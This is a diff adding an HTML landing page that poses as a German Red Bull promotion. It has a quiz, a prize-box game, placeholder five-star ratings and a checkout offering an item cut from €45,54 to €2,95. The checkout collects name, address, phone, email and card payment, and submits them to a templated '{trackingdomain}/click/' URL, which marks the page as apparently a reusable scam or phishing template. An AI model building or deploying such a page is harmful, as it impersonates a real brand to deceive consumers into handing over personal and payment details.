@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="de">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="shortcut icon" href="./assets/favicon_1.png" />
+
+    <title>Red Bull verleiht Flügel - RedBull DE</title>
+
+    <link rel="stylesheet" href="./assets/intlTelInput.css">
+
+    <link rel="stylesheet" href="./assets/loader.css" />
+    <link rel="stylesheet" href="./assets/boxes.css" />
+    <link rel="stylesheet" href="./assets/main.css" />
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    <link as="image" href="./assets/flags.png" rel="preload">
+    <link as="image" href="./assets/flags_2x.png" rel="preload">
+
+    <style>
+      header {
+        border-bottom: 1px solid #e0dad5;
+        display: flex;
+        background-color: #00162b;
+        padding: 15px;
+        width: 100%;
+        justify-content: space-between;
+        align-items: center;
+      max-height: 56px;
+      }
+.logo{
+  width: 158px;
+  height: 32px;
+}
+.menu{
+  width: 18px;
+  fill: rgb(255, 255, 255);
+border-radius: 50%;
+margin: auto;
+}
+.menu_con{
+ background-color: #0d2236;
+  display: flex;
+ width: 32px;
+ height: 32px;
+  border: 1px solid #3d4e5e;
+ border-radius: 50%;
+ align-items: center;
+}
+.user{
+  width: 28px;
+  fill:rgb(255, 255, 255)
+}
+.loader_gif{
+  border-radius: 56%;
+  margin-top: 350px;
+}
+
+    </style>
+  </head>
+  <body id="mainBody">
+    <div class="loader">
+     <img src="./assets/loader_RB_gif.gif" alt="" class="loader_gif" style="height: 150px;">
+    </div>
+
+    <header>
+      <div class="menu_con">
+       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="menu"><g fill-rule="evenodd"><path fill="none" d="M0 0h24v24H0z"></path><path d="M12 17.333A1.333 1.333 0 1 1 12 20a1.333 1.333 0 0 1 0-2.667Zm6.667 0a1.333 1.333 0 1 1 0 2.667 1.333 1.333 0 0 1 0-2.667Zm-13.334 0a1.333 1.333 0 1 1 0 2.667 1.333 1.333 0 0 1 0-2.667ZM12 10.667a1.333 1.333 0 1 1 0 2.666 1.333 1.333 0 0 1 0-2.666Zm-6.667 0a1.333 1.333 0 1 1 0 2.666 1.333 1.333 0 0 1 0-2.666Zm13.334 0a1.333 1.333 0 1 1 0 2.666 1.333 1.333 0 0 1 0-2.666ZM12 4a1.333 1.333 0 1 1 0 2.667A1.333 1.333 0 0 1 12 4ZM5.333 4a1.333 1.333 0 1 1 0 2.667 1.333 1.333 0 0 1 0-2.667Zm13.334 0a1.333 1.333 0 1 1 0 2.667 1.333 1.333 0 0 1 0-2.667Z"></path></g></svg>
+     </div>
+      
+   <img src="./assets/logo.svg" alt="" class="logo">
+   
+
+   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="user"><path d="M12.006 14.75a3.612 3.612 0 0 1-3.658-3.4l-.3-2.606a3.943 3.943 0 0 1 .86-3.188 4 4 0 0 1 3.098-1.306A4 4 0 0 1 15.1 5.56a3.95 3.95 0 0 1 .858 3.206l-.292 2.588a3.614 3.614 0 0 1-3.66 3.396Zm0-9a2.53 2.53 0 0 0-1.961.792 2.482 2.482 0 0 0-.505 2.015l.3 2.628a2.172 2.172 0 0 0 4.338 0l.295-2.609a2.507 2.507 0 0 0-.5-2.034 2.539 2.539 0 0 0-1.967-.792Zm6.98 14.73a5.952 5.952 0 0 0-2.83-4.77.5.5 0 0 0-.7.1l-.31.34a.4.4 0 0 0 .1.69A4.855 4.855 0 0 1 17.3 19.5H6.706a4.913 4.913 0 0 1 2.05-2.66.4.4 0 0 0 .11-.69l-.31-.34a.5.5 0 0 0-.7-.1 5.952 5.952 0 0 0-2.83 4.77.5.5 0 0 0 .5.52h12.96a.5.5 0 0 0 .5-.52Z"></path></svg>
+
+   
+    </header>
+
+    <section style="display: none;" id="main" class="page page__container">
+      <main id="mainHero" class="hero">
+        <div class="hero__content">
+          <div id="mainHeroDescription" class="hero__description">
+            <p id="mainProductHeader" class="hero__description-text"></p>
+            <p id="mainProductName" class="hero__description-title"></p>
+            <p class="hero__price">
+              <span id="mainProductOldPrice" class="hero__price-primary"></span>
+              <span id="mainProductNewPrice" class="hero__price-sale"></span>
+            </p>
+          </div>
+          <p id="mainProductText" class="text"></p>
+          <div id="questions">
+          </div>
+        </div>
+      </main>
+      <div class="ratingbox">
+        <div class="rating">
+          <div class="rat">
+            <!-- <h2 id="ratingRr" class="h2rat"></h2>
+           
+            <span id="ratingPercent" class="percentrat"></span> -->
+            
+            <img src="./assets/rating_logo.jpg" alt="" class="ratingLogo">
+            
+            <span id="ratingRecRat" class="recrat">5.0</span>
+           
+            <div class="starsbox">
+              <div id="stars" class="stars"></div>
+              <div class="starstext">5.0</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div id="reviews" class="reviews"></div>
+    </section>
+
+    <section style="display: none;" id="game">
+      <main id="boxes" class="page page__container"></main>
+    </section>
+
+    <section style="display: none;" id="checkout">
+      <div id="checkoutContent">
+        <form action="https://{trackingdomain}/click/"
+          class="page page__container data-checkout-stage">
+          <input type="hidden" name="origin" value="{origin}">
+          <input id="countryCodeHiddenField" type="hidden" name="country_code">
+          <input type="hidden" name="product_name">
+<input type="hidden" name="product_image"> 
+          <div class="row shipment-section-m pt-2">
+            <div class="col-sm-8 checkout-products pb-lg-3">
+              <div class="shipping-section">
+                <div class="single-shipping">
+                  <div class="card">
+                    <div class="card-body shipping-content">
+                      <div class="shipping-form">
+                        <div class="shipping-address pl-0 pl-lg-3">
+                          <div id="checkoutMobileOffer" class="mobile-offer">
+                            <div class="card">
+                              <div
+                                style="border-bottom: 1px solid rgb(225, 225, 225); align-items: center; display: flex;">
+                                <div class="offer-photo">
+                                  <img id="checkoutCurrentPhoto"
+                                    src="./assets/box.png">
+                                </div>
+                                <div class="offer-details">
+                                  <div id="checkoutOfferName" class="offer-name">Name</div>
+                                  <div id="checkoutOfferSize" class="offer-name">Size:
+                                    EU 38</div>
+                                  <div class="price mt-2">
+                                    <span id="checkoutOldPrice"
+                                      style="text-decoration: line-through;">€
+                                      45,54</span>
+                                    <span id="checkoutNewPrice" class="!tw-ml-2"
+                                      style="font-weight: bold; color: red;">€
+                                      2,95</span>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                          <fieldset
+                            class="shipping-method-block"
+                            style="border-bottom: 1px solid rgb(225, 225, 225);">
+                            <div class="row">
+                              <div class="col-md-4 pl-lg-0">
+                                <h3 id="deliveryHeader">Delivery</h3>
+                              </div>
+                              <div class="col-md-8">
+                                <div class="leading-lines shipping-method-list">
+                                  <div class="row">
+                                    <div class="col-12">
+                                      <div class="form-group">
+                                        <label
+                                          id="cityFieldLabel"
+                                          class="form-control-label moveLabel"
+                                          for="cityField">City</label>
+                                        <input id="cityField" type="text"
+                                          class="form-control shippingAddressTwo"
+                                          name="city" required>
+                                      </div>
+                                    </div>
+                                  </div>
+                                  <div class="row">
+                                    <div class="col-12">
+                                      <div class="form-group">
+                                        <label
+                                          id="addressFieldLabel"
+                                          class="form-control-label moveLabel"
+                                          for="addressField">Address</label>
+                                        <input
+                                          id="addressField" type="text"
+                                          class="form-control shippingAddressTwo"
+                                          name="address" required>
+                                      </div>
+                                    </div>
+                                  </div>
+                                  <div class="row">
+                                    <div class="col-12">
+                                      <div class="form-group">
+                                        <label
+                                          id="zipFieldLabel"
+                                          class="form-control-label moveLabel"
+                                          for="zipField">Postleitzahl</label>
+                                        <input
+                                          id="zipField" type="text"
+                                          class="form-control shippingAddressTwo"
+                                          name="zip" required>
+                                      </div>
+                                    </div>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                          </fieldset>
+                          <fieldset
+                            class="shipping-method-block"
+                            style="border-bottom: 1px solid rgb(225, 225, 225);">
+                            <div class="row">
+                              <div class="col-md-4 pl-lg-0">
+                                <h3 id="paymentHeader">Zahlungsmöglichkeiten</h3>
+                              </div>
+                              <div class="col-md-8">
+                                <div
+                                  class="row leading-lines shipping-method-list">
+                                  <div class="setSelected-Bg">
+                                    <div
+                                      class="form-check col-9 start-lines p-0 selected">
+                                      <input
+                                        name="online_pay"
+                                        type="radio"
+                                        class="form-check-input shipping-method-checkbox"
+                                        value="001">
+                                      <label
+                                        class="form-check-label shipping-method-option"
+                                        for="shippingMethod-001-ade7bec383cacb5d44fcc51ffc">
+                                        <span id="paymentMethodLabel"
+                                          class="display-name">Online mit
+                                          Karte bezahlen</span>
+                                      </label>
+                                    </div>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                          </fieldset>
+                          <fieldset
+                            class="shipping-method-block"
+                            style="border-bottom: 1px solid rgb(225, 225, 225);">
+                            <div class="row">
+                              <div class="col-md-4 pl-lg-0">
+                                <h3 id="personalInfoHeader">Persönliche
+                                  Informationen</h3>
+                              </div>
+                              <div class="col-md-8">
+                                <div class="leading-lines shipping-method-list">
+                                  <div class="row">
+                                    <div class="col-12">
+                                      <div class="form-group">
+                                        <label
+                                          id="nameFieldLabel"
+                                          class="form-control-label moveLabel"
+                                          for="nameField">Vorname
+                                        </label>
+                                        <input
+                                          id="nameField" type="text"
+                                          class="form-control shippingAddressTwo"
+                                          name="name" required>
+                                      </div>
+                                    </div>
+                                  </div>
+                                  <div class="row">
+                                    <div class="col-12">
+                                      <div class="form-group">
+                                        <label
+                                          id="familyFieldLabel"
+                                          class="form-control-label moveLabel"
+                                          for="familyField">Nachname
+                                        </label>
+                                        <input
+                                          id="familyField" type="text"
+                                          class="form-control shippingAddressTwo"
+                                          name="family" required>
+                                      </div>
+                                    </div>
+                                  </div>
+                                  <div class="row">
+                                    <div class="col-12">
+                                      <div class="form-group">
+                                        <label
+                                          id="phoneFieldLabel"
+                                          class="form-control-label moveLabel"
+                                          for="phoneField">Rufnummer
+                                        </label>
+                                        <input
+                                          id="phoneField" type="tel"
+                                          class="form-control shippingAddressTwo"
+                                          name="phone" required>
+                                      </div>
+                                    </div>
+                                  </div>
+                                  <div class="row">
+                                    <div class="col-12">
+                                      <div class="form-group">
+                                        <label
+                                          id="emailFieldLabel"
+                                          class="form-control-label moveLabel"
+                                          for="emailField">E-Mail
+                                        </label>
+                                        <input
+                                          id="emailField" type="email"
+                                          class="form-control shippingAddressTwo"
+                                          name="email" required>
+                                      </div>
+                                    </div>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                          </fieldset>
+                          <div class="row mx-0 mb-3">
+                            <div
+                              class="col-12 next-step-button ml-lg-auto px-lg-0">
+                              <div class="pt-lg-4 ml-lg-3">
+                                <button id="submitButton" type="submit"
+                                  class="btn btn-primary btn-block submit-shipping">
+                                  Go to checkout
+                                </button>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="col-sm-4 shipment-order-summary">
+              <div id="checkoutPcOffer" class="non-mobile-offer"></div>
+              <div class="card">
+                <div class="card-header">
+                  <h2 id="checkoutTotalTitle" class="card-header-custom mb-2">Zusammenfassung
+                    des Beschlusses</h2>
+                  <div class="card-body order-total-summary">
+                    <div class="row leading-lines shipping-item">
+                      <div class="col-6 start-lines">
+                        <p class="order-receipt-label">
+                          <span id="checkoutTotalSubtotalTitle">Wert der
+                            Bestellung</span>
+                        </p>
+                      </div>
+                      <div class="col-6 end-lines">
+                        <p class="text-right">
+                          <span id="checkoutTotalSubtotalAmount"
+                            class="shipping-total-cost">€ 2,95</span>
+                        </p>
+                      </div>
+                    </div>
+                    <div class="row leading-lines shipping-item">
+                      <div class="col-6 start-lines">
+                        <p class="order-receipt-label">
+                          <span id="checkoutTotalDeliveryTitle">Lieferung</span>
+                        </p>
+                      </div>
+                      <div class="col-6 end-lines">
+                        <p class="text-right">
+                          <span id="checkoutTotalDeliveryAmount"
+                            class="shipping-total-cost">€ 0,00</span>
+                        </p>
+                      </div>
+                    </div>
+                    <div class="row leading-lines">
+                      <div class="col-6 start-lines">
+                        <p class="order-receipt-label boldTitle">
+                          <span id="checkoutTotalTotalTitle">Insgesamt</span>
+                        </p>
+                      </div>
+                      <div class="col-6 end-lines">
+                        <p class="text-right">
+                          <span id="checkoutTotalTotalAmount"
+                            class="grand-total-sum">€ 2,95</span>
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </form>
+      </div>
+    </section>
+
+    <footer>
+      <script
+        src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/6.8.4/swiper-bundle.min.js"
+        integrity="sha512-BABFxitBmYt44N6n1NIJkGOsNaVaCs/GpaJwDktrfkWIBFnMD6p5l9m+Kc/4SLJSJ4mYf+cstX98NYrsG/M9ag=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+      <script
+        src="./assets/intlTelInput.min.js"></script>
+      <script src="./assets/imask.js"></script>
+      <script src="./assets/config.js"></script>
+      <script src="./assets/checkout.js"></script>
+      <script src="./assets/game.js"></script>
+      <script src="./assets/questions.js"></script>
+      <script src="./assets/main.js"></script>
+    </footer>
+  </body>
+</html>
